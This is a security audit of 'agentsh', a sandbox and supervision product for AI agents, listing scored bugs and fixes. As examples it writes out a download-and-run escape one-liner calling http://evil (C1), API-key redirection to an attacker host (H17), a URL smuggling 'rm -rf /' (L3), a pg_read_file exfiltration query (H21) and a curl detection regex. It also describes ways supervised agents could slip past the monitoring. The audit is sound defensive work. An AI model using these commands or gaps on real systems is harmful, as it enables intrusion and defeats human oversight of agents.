# agentsh Codebase Audit — Consolidated Bug & Issue List

Generated by a parallel read-only review of ~180k LOC across the whole repo
(Linux/macOS/Windows security-sandboxing + agent-supervision product).
Each item carries a **Score 1–10** (10 = fix first) and a severity bucket.

Scoring guide:
- **9–10 Critical** — likely sandbox-escape, auth bypass, or RCE; fix before ship.
- **7–8 High** — real security/correctness defect with concrete impact.
- **5–6 Medium** — robustness / fail-open / resource issue; fix soon.
- **2–4 Low** — hardening / latent; fix opportunistically.

> Locations are `path/file.go` (+approx line where given). Items marked
> `[needs verification]` were flagged but need a confirming call-site/test.

## CRITICAL (fix first)

### C1. Score 10 — Shell-shim enforcement bypass via `&` / process-substitution
- **Where:** `cmd/agentsh-shell-shim/main.go` (`containsCompoundOperator`, `isAgentshCommand` bypass)
- **Issue:** The agentsh-CLI deadlock bypass execs the real shell directly (skipping routing + kernel-install) when the `-c` string's first command resolves to the agentsh binary. `containsCompoundOperator` rejects `;` backtick `\n` `&&` `||` `$(` `|` but **not** a standalone background `&` or process-substitution `>(`/`<(`.
- **Impact:** Trivial one-line sandbox escape: `agentsh --version & curl -o /tmp/e http://evil & sh /tmp/e` runs unsupervised.
- **Fix:** Make the bypass fail-closed — only bypass a single fully-resolved agentsh command with no shell metacharacters; detect standalone `&` (excluding `>&`/`<&` redirects) and `>(`/`<(`.

### C2. Score 9 — x32 / foreign-ABI syscalls bypass the seccomp BPF and TRACESYSGOOD dispatch
- **Where:** `internal/ptrace/seccomp_filter.go:72-76` (arch check), `internal/ptrace/syscalls.go:1-110` (dispatch)
- **Issue:** BPF checks `arch == AUDIT_ARCH_X86_64` then compares `nr` against native numbers. The x32 ABI shares arch `0xC000003E` but sets bit 30 in `nr`; such numbers match no `JEQ` → fall through to `SECCOMP_RET_ALLOW` with no ptrace stop / policy eval. Non-prefilter dispatch likewise hits `default: allowSyscall`.
- **Impact:** A tracee issuing x32 syscalls bypasses ALL file/network/exec/signal policy.
- **Fix:** Add a BPF rule rejecting x32 (`nr & 0x40000000 != 0`) and non-native arches with `SECCOMP_RET_ERRNO(ENOSYS)`; make `dispatchSyscall` fail-closed for unknown/high-bit numbers.

### C3. Score 9 — WSL2 / Lima fallback `Execute` command injection
- **Where:** `internal/platform/wsl2/sandbox.go`, `internal/platform/lima/sandbox.go` (`Execute` default branch)
- **Issue:** When isolation is unavailable, builds `shellCmd := fmt.Sprintf("cd %s && %s", workspace, cmd)` and appends each arg with `" "+arg`, run via `sh -c`. No escaping of `cmd`, `args`, or `workspace`.
- **Impact:** An agent arg containing `;`, `|`, `$()`, backticks → arbitrary commands in the WSL/Lima VM = direct sandbox escape.
- **Fix:** Pass `cmd`/`args` as argv to `wsl … --` (as Full/Partial branches already do); never build a shell string.

### C4. Score 9 — Supply-chain check bypass via silent provider partial failure
- **Where:** `internal/pkgcheck/provider/depsdev.go:110-123` (also `provider/osv.go`, `provider/socket.go`); consumer `internal/pkgcheck/orchestrator.go:96-110`; `internal/pkgcheck/checker.go:81-103`
- **Issue:** deps.dev `CheckBatch` returns `(*CheckResponse, nil)` (always nil error), setting only `Metadata.Partial=true` for packages whose `fetchVersion` errored. The orchestrator records a `ProviderError` only when `err != nil`; packages with no finding + no error are absent from `pkgMap` → `VerdictAllow`. OSV/Socket have the identical pattern (Snyk is partially protected — returns a partial-batch error).
- **Impact:** A network blip / 429 on a hostile package silently allows the install, defeating an `on_failure=deny` gate.
- **Fix:** Treat `Metadata.Partial` (or any per-package gap vs the request set) as a `ProviderError` so `on_failure` policy fires; have all providers return a partial-batch error like Snyk.

### C5. Score 8 — `ratelimit.Limiter.WaitN` token bug + `rate==0` + race
- **Where:** `pkg/ratelimit/limiter.go:181-214`
- **Issue:** Post-sleep bookkeeping restores the pre-wait token count then subtracts `n`, clamping to 0 — discarding replenishment accrued during the sleep. `rate==0` (settable via `SetRate`) → `needed/l.rate = +Inf` → `time.Duration(+Inf)` overflow = broken/wedge. The unlock→sleep→relock window lets a concurrent `AllowN`/`WaitN` clobber `l.tokens`/`l.lastTime`.
- **Impact:** Limiter under-refills (effective rate far below configured); can wedge callers when rate=0; race-detector flaggable.
- **Fix:** Recompute tokens from `lastTime` after waking; guard `rate==0`; hold the lock across consume (or use a condition-variable/Timer approach).

## HIGH

### H1. Score 8 — Secret cache bypasses approval AND is shared across agents
- **Where:** `pkg/secrets/manager.go` (`Get` ~300) + `pkg/secrets/cache.go` (`key` ~70)
- **Issue:** `Get` checks the cache **before** the `RequireApproval` block, and the cache key is `provider+":"+path` with no `AgentID`/principal. Once any requester's approved fetch populates the cache, every later `Get` returns the secret with no approval check.
- **Impact:** Authorization bypass — agent B reads a secret only agent A was approved for; revoking an approval has no effect for up to `CacheTTL` (default 5m).
- **Fix:** Include the principal in the cache key and re-evaluate approval on every cache hit (or disable caching when `RequireApproval`).

### H2. Score 8 — Seccomp file handler fail-open on path-resolution failure (mutating ops)
- **Where:** `internal/netmonitor/unix/handler.go` (`handleFileNotificationEmulated`, write-path resolution block)
- **Issue:** When `resolvePathAt` fails for a mutating op (write/delete/rename) and the `/proc/<pid>/mem` fallback also fails, the handler logs "file policy not enforced" and responds `CONTINUE` (allow).
- **Impact:** Under Yama `ptrace_scope` or any introspection failure, a sandboxed process performs denied write/delete/mkdir/rename unblocked.
- **Fix:** Respond `DENY` (fail-closed) on mutating-op path-resolution failure.

### H3. Score 8 — Session teardown leaks LLM proxy + never zeroes the credential table
- **Where:** `internal/api/app.go` (`destroySession`), `internal/api/grpc.go` (`DestroySession`), `internal/server/server.go` (`reapOnce`/`Close`), `internal/session/llmproxy.go` (`StartLLMProxy` → `SetLLMProxy`)
- **Issue:** `StartLLMProxy` stores its stop fn + secrets cleanup via `SetLLMProxy`/`SetCredsTable`; the only consumers are `CloseLLMProxy`/`secretsClose`. But every production teardown path calls only `CloseDBProxy/CloseNetNS/CloseProxy/UnmountWorkspace` — **none** calls `CloseLLMProxy`. Only `Session.cleanup()` (creation-error path) does.
- **Impact:** Every destroyed/timed-out session leaks the embedded LLM proxy listener + goroutines and leaves the `credsub.Table` (real credentials) un-zeroed in memory.
- **Fix:** Route all teardown through `Session.cleanup()` (or add `CloseLLMProxy()` to `destroySession`, `reapOnce`, `server.Close`, gRPC `DestroySession`).

### H4. Score 8 — FUSE `Symlink`/`Open` no target validation → symlink host escape
- **Where:** `internal/platform/fuse/ops.go` (`Symlink`, `Open`)
- **Issue:** `Symlink(target, newpath)` calls `os.Symlink(target, realPath)` with no `target` validation; `Open`/`Create` then `os.OpenFile(realPath,…)` follows symlinks. `FSConfig.SymlinkEscapeDeny` is plumbed via fsmonitor (Linux) but never read in this generic `fuse` package used by darwin/Windows.
- **Impact:** A sandboxed process creates a symlink inside the workspace to `/etc/passwd` (or any host path) and reads it through the FUSE mount = host escape.
- **Fix:** Validate `target` against `realRoot` (deny / honor `SymlinkEscapeDeny`); use `O_NOFOLLOW` semantics / reject escaping symlinks in `Open`.

### H5. Score 8 — FUSE + PolicyAdapter default to ALLOW when engine/handler is nil (fail-open)
- **Where:** `internal/platform/fuse/ops.go` (`checkPolicy`), `internal/platform/linux/filesystem.go` (`wrapPolicyEngine`), `internal/platform/policy_adapter.go`, `internal/platform/darwin/policysock/handler.go`, `internal/platform/windows/driver_client.go` (`handleFilePolicyCheck`/`handleRegistryPolicyCheck`/`handleSuspendedProcess`), `windows/exec_handler.go` (`HandleSuspended`)
- **Issue:** Same anti-pattern across the platform layer: `checkPolicy` returns `Allow` when `PolicyEngine==nil`; `wrapPolicyEngine` returns `nil` (→ allow all) for any engine that isn't `*platform.PolicyAdapter`; `PolicyAdapter.Check*` returns `Allow`/"no-policy" when `engine==nil`; `BuildPolicySnapshot` defaults `{File,Network,DNS:"allow"}`; Windows driver checks default to `Allow`/`Resume` when no handler registered.
- **Impact:** A nil/missing engine, a non-default PolicyEngine impl, or an unregistered Windows handler silently allows all file/network/exec — sandbox bypass in a security product.
- **Fix:** Fail closed (deny/terminate) whenever the engine/handler is absent; route through the `PolicyEngine` interface rather than returning nil.

### H6. Score 8 — Windows driver client & WinDivert `Stop()` deadlock (blocking I/O shutdown)
- **Where:** `internal/platform/windows/driver_client.go` (`messageLoop`), `windows/fltlib_windows.go` (`filterGetMessage`), `windows/windivert_windows.go` (`captureLoop`/`Stop`)
- **Issue:** `filterGetMessage` uses synchronous blocking I/O; the loop only checks `stopChan` before the blocking call, and `Disconnect` does `close(stopChan)` then `wg.Wait()` before `CloseHandle(port)`. WinDivert: `Stop()` nils `handle` then `wg.Wait()`, but `handle.Close()` only runs after the wait — `Recv()` stays blocked.
- **Impact:** `Disconnect()`/`Stop()` hang permanently; capture/driver goroutines leak; repeated calls busy-spin.
- **Fix:** Use overlapped I/O tied to `stopChan` / close the handle/port before `wg.Wait()` so blocking calls error out.

### H7. Score 8 — TracerPid masking bypass: legacy `open()` and non-`read` read variants
- **Where:** `internal/ptrace/tracer.go` (`handleSyscallExit` only handles `SYS_OPENAT`/`SYS_OPENAT2`), `internal/ptrace/syscalls.go:50-52` (`isReadSyscall` = `SYS_READ`/`SYS_PREAD64` only), `internal/ptrace/handle_read.go`
- **Issue:** On amd64, `open("/proc/self/status")` (`SYS_OPEN`) never reaches `handleOpenatExit`, so the fd is never tracked and reads are never masked. `readv`, `preadv`, `preadv2`, `sendfile`, `splice`, `copy_file_range` are not in `isReadSyscall`, so a tracked fd read via these returns unmasked `TracerPid: <pid>`.
- **Impact:** A sandboxed process detects it is being ptraced → evasion/anti-analysis.
- **Fix:** Extend fd tracking + read-exit handling to legacy `open`/`creat` and all read-family syscalls, or mask `TracerPid` at the fs layer.

### H8. Score 8 — Tenant & identity stores return internal pointers → quota TOCTOU + data races
- **Where:** `pkg/tenant/store.go`, `pkg/tenant/config.go` (`RecordUsage`, `CheckQuota`), `pkg/identity/store.go` (`Get`, `ValidateCredentials`, `Registry.Authenticate`)
- **Issue:** `InMemoryStore.Get`/`GetUsage` return the internal `*TenantConfig`/`*TenantUsage` pointer under RLock then release; `RecordUsage` mutates `ActiveSessions++` etc. with no lock; `CheckQuota`→`CanStartSession` reads `ActiveSessions` unlocked. `identity` store returns internal `*AgentIdentity`; `Registry.Authenticate` calls `agent.Touch()` on the shared pointer unlocked while `Save` mutates `byAPIKey`/`byTenant`.
- **Impact:** Data race (race-detector flaggable) + classic TOCTOU: two concurrent session starts both observe `ActiveSessions < Max` and both increment, exceeding the tenant concurrency limit. Quota enforcement is not sound under concurrency.
- **Fix:** Return deep copies from read methods; perform check-and-consume atomically under the write lock.

### H9. Score 8 — k8s sidecar: dead world-writable Unix socket + unauthenticated TCP `:9090` API
- **Where:** `pkg/k8s/sidecar.go` (`SidecarRuntime.Start` ~250-290)
- **Issue:** A Unix listener is created via `net.Listen("unix", SocketPath)` + `os.Chmod(...,0666)`, but the HTTP `server` is started with `ListenAndServe()` on TCP `:9090` — the Unix listener is never `Accept`ed (dead, world-writable socket). The live `/healthz`/`/ready`/`/stats` API binds `:9090` on all interfaces with no auth.
- **Impact:** World-writable dead control socket + unauthenticated TCP control/status API exposed to anything that can route to the pod.
- **Fix:** `http.Serve(r.listener, mux)` on the Unix socket; drop TCP `ListenAndServe`; use `0660`/`0600` perms.

### H10. Score 8 — MCP non-SSE tool-call block silently ineffective when response rewrite fails
- **Where:** `internal/proxy/mcp_intercept.go` (`rewriteAnthropicResponse`/`rewriteOpenAIResponse` return `nil` on JSON re-serialize failure) consumed by `internal/proxy/proxy.go` (`ModifyResponse`: `if result.HasBlocked && result.RewrittenBody != nil`)
- **Issue:** `ExtractToolCalls` found a blocked call (`HasBlocked=true`), but if the rewrite returns `nil` (missing/`null` `content`, or `json.Marshal` error), the guard `RewrittenBody != nil` is false → the **original body containing the blocked `tool_use` block is forwarded unchanged**.
- **Impact:** A blocked MCP tool call reaches the agent, which may execute it; block bypassed for non-streaming LLM responses with slightly malformed bodies.
- **Fix:** When `HasBlocked && RewriteBody==nil`, synthesize a safe replacement (or 502/empty tool-call list) rather than forwarding the original.

### H11. Score 8 — Real credentials written to on-disk LLM request-body storage
- **Where:** `internal/proxy/proxy.go` (`ServeHTTP` stores post-hook `reqBody`), `internal/proxy/declared_service.go` (stores pre-hook `storedBody` deliberately)
- **Issue:** The LLM path stores the post-pre-hook request body. Any globally-registered hook that substitutes fake→real creds into the body (e.g. `CredsSubHook` under `""`) causes the real secret to be persisted to `~/.agentsh/sessions/<id>/llm-bodies/<req>.json` (0600). The declared-service path explicitly avoids this; the LLM path does not.
- **Impact:** Plaintext upstream credentials land on disk when body credential substitution is enabled globally.
- **Fix:** Capture the pre-hook body on the LLM path (as declared-service does) for `StoreRequestBody`; store post-hook only as `BodySize`/`BodyHash`.

### H12. Score 8 — Unbounded in-memory buffering of SSE/streaming responses
- **Where:** `internal/proxy/streaming.go` (`streamingResponseWriter.Write` appends every byte to `s.buf`), `internal/proxy/sse_intercept.go` (`SSEInterceptor.Stream` returns `s.buf.Bytes()`)
- **Issue:** Every SSE response is fully buffered in memory with no cap, then also persisted to disk. When TPM is disabled, `inFlightEnabled()` is false → no concurrency bound; each concurrent stream accumulates unbounded memory.
- **Impact:** A large/long streaming response (or many concurrent ones) exhausts supervisor memory (DoS); stored bodies grow disk without bound.
- **Fix:** Cap the per-stream buffer (drop/truncate beyond threshold), enforce an in-flight cap regardless of TPM, or stream-to-disk with a size ceiling.

### H13. Score 7 — `DropCapabilities` only drops the bounding set (effective/inheritable/ambient persist)
- **Where:** `internal/capabilities/drop.go:46-70`
- **Issue:** Only `PR_CAPBSET_DROP` per cap; never clears effective/inheritable/ambient via `capset`/`PR_CAP_AMBIENT`. `PR_SET_NO_NEW_PRIVS` is set only later inside the seccomp-injection path, not here.
- **Impact:** If invoked on the running server process (not strictly pre-exec), always-drop caps like `CAP_SYS_ADMIN`/`CAP_SYS_PTRACE` remain usable.
- **Fix:** After dropping the bounding set, also `capset` to clear permitted/effective/inheritable + `PR_CAP_AMBIENT_CLEAR`/`LOWER`; set `NO_NEW_PRIVS` here; confirm call sites are pre-exec.

### H14. Score 7 — Server defaults to no auth + binds all interfaces
- **Where:** `internal/config/config.go` (`applyDefaultsWithSource` ~1090-1100); `cfg.Server.HTTP.Addr` default `"0.0.0.0:18080"`
- **Issue:** `cfg.Auth.Type` defaults to `"none"` when unset; HTTP bind defaults to `0.0.0.0:18080`; `validateConfig` does not reject `auth.Type: none` / `development.disable_auth`.
- **Impact:** A deployment omitting `auth:` exposes the control/approval HTTP API on all interfaces with no authentication.
- **Fix:** Default `auth.type` to a secure mode (or fail closed when unset); default bind to `127.0.0.1`; reject `disable_auth`/`auth.type: none` outside an explicit dev flag.

### H15. Score 7 — "approve" decisions silently become "allow" when approvals default off
- **Where:** `internal/policy/engine.go` (`wrapDecision` ~760); `internal/config/config.go` (`Approvals.Enabled` bool, no default → false)
- **Issue:** When `enforceApprovals=false`, `wrapDecision` maps an `approve` decision to `EffectiveDecision=Allow` ("shadow mode"). `Approvals.Enabled` has no default → false, so if the engine's flag is wired to that bool, every `decision: approve` rule auto-runs without human gating.
- **Impact:** Operators writing `approve` rules for dangerous commands get silent auto-allow if approvals aren't explicitly enabled.
- **Fix:** Default approval-enforcement on when any `approve` rule exists; refuse to load policies with `approve` decisions while approvals disabled. `[needs verification: NewEngine flag wiring]`

### H16. Score 7 — File reads default to ALLOW (secret exfiltration surface)
- **Where:** `internal/policy/engine.go` (`CheckFile` + `isReadOperation` ~600-640)
- **Issue:** Unmatched read ops (`open`, `stat`, `readlink`, `access`) return `default-allow-reads`. Only explicitly-denied paths blocked; everything else (`~/.ssh/id_rsa`, `/etc/shadow`, app `.env`) is readable by default.
- **Impact:** An agent can exfiltrate arbitrary secrets/keys unless the operator enumerated every sensitive path in a deny rule — opposite of a sandbox's safe default.
- **Fix:** Make reads default-deny (or deny well-known secret paths); enforce a read allowlist.

### H17. Score 7 — `AGENTSH_SERVER` env controls server URL; API key forwarded to it
- **Where:** `cmd/agentsh-shell-shim/main.go` (`serverHTTPBaseURL()`, `kernelinstall.Install({ServerBaseURL:…, APIKey: os.Getenv("AGENTSH_API_KEY")})`)
- **Issue:** The shim is the untrusted user's login shell, yet a user-set `AGENTSH_SERVER=http://evil` redirects kernel-install traffic (and the `AGENTSH_API_KEY`) to an attacker endpoint. If `kernelinstall.Install` fetches a wrapper/config or execs remote content from `ServerBaseURL`, also RCE.
- **Impact:** API-key exfiltration / potential remote-fetch RCE depending on `Install` internals.
- **Fix:** Treat `AGENTSH_SERVER` as untrusted in user-shell context; validate against an allowlist/root-owned config; never forward `AGENTSH_API_KEY` to a non-trusted host. `[needs verification: internal/kernelinstall/install.go]`

### H18. Score 7 — Webhook dispatcher: unbounded goroutines, ignores all errors, `resp.Body` not drained
- **Where:** `internal/webhook/dispatcher.go` (`addEvent` ~175, `send` ~195)
- **Issue:** `addEvent` spawns `go c.send(...)` on every flush with no cap/semaphore/queue; `send` ignores every error (compile/marshal/request/retry all silent); retry `time.Sleep` ignores `ctx.Done()`; `resp.Body` closed without draining (defeats keep-alive).
- **Impact:** Under bursty load, unbounded goroutines accumulate (leak); retries block past context cancellation; all delivery failures invisible to operators.
- **Fix:** Bound concurrency (worker pool / `semaphore.Weighted`), drain `resp.Body`, select on `ctx.Done()` during backoff, surface failures via metrics/audit.

### H19. Score 7 — Shared `http.Client.Timeout` caps SSE/streaming, breaking long-running streams
- **Where:** `internal/client/client.go` (`NewWithTimeout`, `ExecStream`, `StreamSessionEvents`, `WatchTaints`)
- **Issue:** One `*http.Client{Timeout: timeout}` is used for both unary and streaming; `http.Client.Timeout` covers reading the body. `NewWithTimeout(...,0)` coerces 0 → `DefaultClientTimeout` (30s), so there is no way to disable the cap. `ExecStream` streams `/exec/stream` whose server-side default timeout is 5 min.
- **Impact:** Over HTTP transport (default), any streaming exec/event/taint tail longer than the client timeout (30s default) is forcibly terminated mid-stream.
- **Fix:** Use transport-level timeout / per-request `context` for unary and a separate `http.Client{Timeout:0}` for streaming; or document that streaming requires the gRPC transport.

### H20. Score 7 — Daemon install templates invoke an unregistered `server --daemon` flag
- **Where:** `internal/cli/daemon.go` (`systemdServiceTemplate`, `launchdPlistTemplate`), `internal/cli/server.go` (`newServerCmd` registers only `--config`)
- **Issue:** Both generated units set `ExecStart=<exe> server --daemon` / `ProgramArguments=[<exe>,server,--daemon]`, but `--daemon` is not a registered flag anywhere. `agentsh server --daemon` fails "unknown flag: --daemon" and exits non-zero.
- **Impact:** The installed daemon never starts; systemd (`Restart=on-failure`) / launchd (`KeepAlive`) restart-loop it forever. The entire `agentsh daemon install` feature is broken on Linux and macOS.
- **Fix:** Register a `--daemon` flag (or hidden no-op) on the server command, or drop `--daemon` from the templates. Verify by running `agentsh server --daemon`.

### H21. Score 7 — Unsafe-IO / unknown-function detection bypassed via DML and nested expressions
- **Where:** `internal/db/classify/postgres/ast_dml.go` (`classifySelect` calls `appendUnsafeIO`; INSERT/UPDATE/DELETE/MERGE do not), `internal/db/classify/postgres/escalation.go` (`walkFuncCalls` `default:` case)
- **Issue:** (a) `appendUnsafeIO` runs only on SELECT, so `UPDATE t SET col=pg_read_file('/etc/passwd') RETURNING col` classifies as `modify`+`read` with no `unsafe_io`. (b) `walkFuncCalls` has no case for `Aggref`/`WindowFunc`/`XmlExpr`/`CoerceToDomain`/`FieldSelect`/`ArrayCoerceExpr`, so `SELECT sum(pg_read_file(...))` never descends into `Aggref.Args`; the inner `pg_read_file` is never visited (also defeats unknown-function escalation).
- **Issue impact:** A statement that allows `read` but denies `unsafe_io`/`procedural` is defeated by hiding the call in DML `RETURNING`/`USING` or inside an aggregate/window/XML/coercion expression → server-file exfiltration / function-escalation bypass.
- **Fix:** Call `appendUnsafeIO` from all DML handlers (over value lists / WHERE / RETURNING / USING); add the missing AST cases (or drive the walker via protobuf reflection like `redirect/walk.go`).

### H22. Score 7 — Session-ID file opened without `O_NOFOLLOW` on `/tmp`-backed dirs (symlink attack)
- **Where:** `internal/shim/session_id.go:171` (`os.OpenFile(path, O_RDWR|O_CREATE, 0o600)`), base dirs `internal/shim/flock_unix.go:23-28`
- **Issue:** On the `/tmp/agentsh` fallback base (parent `/tmp` world-writable), an attacker who pre-creates `/tmp/agentsh/session-global.sid` (or a workspace `.sid`) as a symlink to a victim file causes the shim to (a) read that target's bytes as the session id (info leak to the server) and (b) `Truncate(0)`+write `"session-<uuid>\n"` over the target.
- **Impact:** Cross-user session-id spoofing / clobbering of user-writable files on shared hosts.
- **Fix:** Open with `O_RDWR|O_CREATE|O_EXCL|O_NOFOLLOW` (retry on EEXIST after stat-rejecting symlinks), or scope session dirs to `0o700`.

## MEDIUM

### M1. Score 6 — Received seccomp-notify fd lacks CLOEXEC; extra passed fds leaked
- **Where:** `internal/netmonitor/unix/fdpass.go` (`RecvFD`: `unix.Recvmsg(...,0)`, wraps only `fds[0]`, ignores the rest)
- **Issue:** The notify fd is created without `FD_CLOEXEC`; Go's `os/exec` doesn't generically close non-CLOEXEC fds before `execve`. If the supervisor spawns a sibling/re-execs, the notify fd is inherited → a sibling could `SECCOMP_IOCTL_NOTIF_SEND` `CONTINUE`/`DENY` responses. Extra fds in the control message are never closed.
- **Fix:** Receive with `unix.MSG_CMSG_CLOEXEC` (and `fcntl FD_CLOEXEC` defensively); `close` every `fds[i]` except the one returned. *(Also see H-series: `agentsh-unixwrap` `defer Close()` is a no-op across `syscall.Exec` — assert CLOEXEC on notify+signal fds before exec.)*

### M2. Score 6 — `handleRedirect` injects stub fd at fixed fd 100 (`dup2`) without CLOEXEC
- **Where:** `internal/netmonitor/unix/redirect_linux.go` (`handleRedirect`: `NotifAddFD(targetFD=100, SETFD)`), `addfd_linux.go` (`NotifAddFD` always `newfdFlags:0`)
- **Issue:** `SECCOMP_ADDFD_FLAG_SETFD` has `dup2` semantics — it silently closes/replaces whatever the tracee had at fd 100. The injected stub socket also lacks `O_CLOEXEC`, so it survives the stub's later exec.
- **Fix:** Pick a free fd (or scan for an unused high fd) rather than fixed 100; set `O_CLOEXEC` via `newfdFlags`.

### M3. Score 6 — DNS-rebinding / SSRF: proxy dials a resolved IP after a hostname-only policy check
- **Where:** `internal/netmonitor/proxy.go` (`resolveAndEmitDNS` via `net.DefaultResolver`; `handleConnect` checks `checkConnectNetwork(ctx, host, …)` on the hostname, then `connectDialTarget` dials `ResolvedIP`), `internal/policy/engine.go` (`CheckNetworkCtx`/`resolveIPs` ~660-700), `internal/netmonitor/pnacl/policy.go` (`evaluateNetworkTarget` parses `ctx.Host` as IP)
- **Issue:** The HTTP-proxy path resolves DNS via the **system resolver** (bypassing the agent's intercepted DNS listener + DNS-level policy), pins that IP, and dials it — but the allow/deny decision is on the **hostname only**, never the resolved IP. No IP/CIDR enforcement (unlike the transparent path's `CheckNetworkIP`). pnacl CIDR/IP rules never match when `ctx.Host` is a hostname. The policy engine resolves server-side then the sandbox resolves again at connect time.
- **Impact:** An allowlisted hostname that resolves (via attacker/rebinding DNS, or `/etc/hosts`) to a private/internal IP yields SSRF to internal services; CIDR allow/deny is ineffective for hostname contexts.
- **Fix:** Resolve through the agent's DNS interceptor and evaluate policy on the resolved IP (mirror `CheckNetworkIP`) before dialing; carry the resolved IP alongside the hostname in connection contexts; enforce CIDR at the actual connect site.

### M4. Score 6 — API key with missing role becomes admin
- **Where:** `internal/auth/apikey.go` (`LoadAPIKeys` ~43: `if role == "" { role = "admin" }`)
- **Fix:** Default to least privilege (`agent`).

## LOW / HARDENING

### L1. Score 4 — `agentsh-unixwrap` relies on `defer Close()` across `syscall.Exec` (defers never run)
- **Where:** `cmd/agentsh-unixwrap/main.go` (`defer filt.Close()`, `defer sigFilter.Close()` then `syscall.Exec`)
- **Issue:** `syscall.Exec` replaces the process image without running deferred functions; the seccomp notify fd (`filt.NotifFD()`) and signal fd are only `defer`-closed. Cleanup depends entirely on `FD_CLOEXEC` being set.
- **Impact:** If either fd lacks CLOEXEC, the sandboxed command inherits the seccomp notify fd and could `SECCOMP_IOCTL_NOTIF_SEND_RESP` on its own trapped syscalls — direct policy bypass.
- **Fix:** Explicitly close/dup-with-CLOEXEC the notify+signal fds before `syscall.Exec`; assert CLOEXEC in the filter setup.

### L2. Score 4 — `execStream`/`events` SSE scanner 64KB limit truncates large chunks
- **Where:** `internal/cli/exec.go` (`execStream`), `internal/cli/events.go` (`newEventsTailCmd`)
- **Issue:** `bufio.NewScanner(body)` default 64KB max token; a `data:` SSE line carrying >64KB makes `Scan()` return false / `ErrTooLong`. (`llm_logs.go` correctly calls `sc.Buffer(...,1<<20)`.)
- **Fix:** Raise the scanner buffer like `llm_logs.go`, or read with `bufio.Reader` line-by-line.

### L3. Score 4 — `shellSubstitutions` prints an unquoted URL (prompt-injection-to-shell)
- **Where:** `internal/cli/exec.go` (`shellSubstitutions`)
- **Issue:** For blocked `curl` calls it prints `agentsh: try: wget -qO- <url>` where `<url>` is verbatim from `resp.Request.Args`, no quoting/escaping. A URL with shell metacharacters (`http://x; rm -rf /`) yields an executable shell string an LLM agent may copy-paste/execute.
- **Fix:** Shell-quote the URL (`%q`/`shellescape`) or print the URL as data, not a runnable command.

### L4. Score 4 — `AGENTSH_IN_SESSION=1` is an env-controlled fail-open
- **Where:** `cmd/agentsh-shell-shim/main.go` (`if inSession == "1" { runAndExit(inSessShell, …) }`)
- **Issue:** The recursion guard is caller-settable; relies on the kernel-install (seccomp) branch running first, but if `shim_install=off` (or bare interactive shell where the kernel branch is skipped), a user who sets `AGENTSH_IN_SESSION=1` execs the real shell with no enforcement.
- **Fix:** Only honor `AGENTSH_IN_SESSION` when set by a trusted parent (sealed/signed channel), not raw env.

### L5. Score 4 — Unsigned on-disk caches allow poisoning + stale "clean" entries
- **Where:** `internal/pkgcheck/cache/cache.go:62-75,118-140`, `internal/skillcheck/cache/cache.go:42-62`
- **Issue:** Both load JSON verbatim with no integrity check (0600 limits but doesn't eliminate risk). A "clean" entry cached for `CleanTTL` (default 24h) returns a stale allow during a registry yank-and-republish or a skills.sh status change; `skillcheck` cache key is content-SHA so external reputation changes are masked until TTL.
- **Fix:** Bind cache entries to a content+reputation version, or re-validate with a short freshness probe; consider a MAC if the cache dir is shared.

### L6. Score 4 — `skillcheck` orchestrator misses partial-with-findings failures
- **Where:** `internal/skillcheck/orchestrator.go:79-86`
- **Issue:** Records a `ProviderError` only when `err != nil` or (`Metadata.Error != "" && len(resp.Findings)==0`). The Snyk subprocess provider returns `(resp with findings + Metadata.Error, nil)` on partial failure with some findings — records no error, so `actionFloorFromProviderErrors` isn't applied and failed sub-checks are silently dropped.
- **Fix:** Record a `ProviderError` whenever `resp.Metadata.Partial` or `Metadata.Error != ""`, regardless of finding count.

### L7. Score 4 — `recvNotifyFD` has no deadline/context (relay hang)
- **Where:** `internal/shim/kernelinstall/install_linux.go` (`runRelay` → `recvNotifyFD(parentFile)`)
- **Issue:** `unix.Recvmsg` on `parentFile` blocks indefinitely if the wrapper starts but neither sends the fd nor exits. No `SetReadDeadline`/context wired.

### L8. Score 4 — `mcpinspect` detector regex ReDoS + recursive schema walk

- **Issue:** MCP lines up to 1 MiB; several unanchored regexes with quantifiers (`base64.*\|.*curl`, `[A-Za-z0-9+/]{1000,}`) can exhibit catastrophic backtracking, stalling the inspection goroutine (blocking the MCP stream). `inspectSchemaNode` recursion depth = JSON nesting (bounded by `encoding/json`'s 10000 — still a stack-overflow risk).

### L14. Score 3 — BPF `Jt`/`Jf` jump offsets are `uint8`; overflow with many rules

## Cross-cutting themes (worth fixing as a class)

- **Fail-open-when-engine/handler-nil:** H5, plus policy-store/secret-cache gaps — a missing/nil enforcement component should always default to deny in a security product.
- **Seccomp-notify fd CLOEXEC / leak:** M1, M2, L1 — receive with `MSG_CMSG_CLOEXEC`, set `O_CLOEXEC`, never rely on `defer` across `syscall.Exec`, never `dup2` a fixed fd.
- **DNS rebinding / IP-vs-hostname policy gap:** M3 — resolve through the agent's interceptor and evaluate CIDR on the resolved IP at the actual connect site.
- **Unbounded maps/goroutines (resource-exhaustion DoS):** H12, M17, M18, M21, M22, M51, L9, L17, L19 — add caps/LRU/semaphores and evict on session/process end.
- **Blocking-I/O shutdown deadlocks:** H6, M13, M24, M26, M34, M39, L7 — close the handle/port/conn before `wg.Wait()`, use ctx-driven deadlines on blocking reads.
- **Secret leakage to logs/storage:** H1, H11, M20, M36, L35 — redact headers/args, store pre-hook bodies, zero caches, never forward keys to env-controlled hosts.
- **Supply-chain / classifier bypass via partial failure:** C4, H21, M56, L6 — treat partials as provider errors; run unsafe-IO / function walkers over all statement types and all nested expression nodes.
